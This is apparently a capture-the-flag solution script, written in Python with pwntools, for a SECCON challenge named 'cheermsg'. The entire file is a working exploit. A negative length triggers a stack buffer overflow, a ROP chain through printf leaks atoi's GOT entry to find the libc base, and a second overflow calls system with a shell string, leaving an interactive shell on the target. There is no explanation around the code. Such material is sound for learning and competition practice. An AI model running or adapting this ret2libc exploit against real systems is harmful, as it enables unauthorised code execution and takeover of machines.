#!/usr/bin/env python
from pwn import *

r = remote('cheermsg.pwn.seccon.jp', 30527)
#r = remote('127.0.0.1', 4000)

libc = ELF('libc-2.19.so')
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')



# leak info
r.sendline('-100')

printf = 0x08048430
atoi_got = 0x804a02c
main = 0x080485ca

r.sendlineafter('Name >> ', 'A'*48 + p32(printf) + p32(main) + p32(0x804a02c))
r.recvline()
r.recvline()
r.recvline()

atoi = r.recv()
atoi = u32(atoi[:4])
print hex(atoi)
base = atoi - libc.symbols['atoi']
print hex(base)
system = base + libc.symbols['system']
sh = base + 0x0e469

sleep(0.1)

# exploit
r.sendline('-100')
r.sendlineafter('Name >> ', 'A'*48 + p32(system) + p32(0xdeadbeef) + p32(sh))

r.interactive()
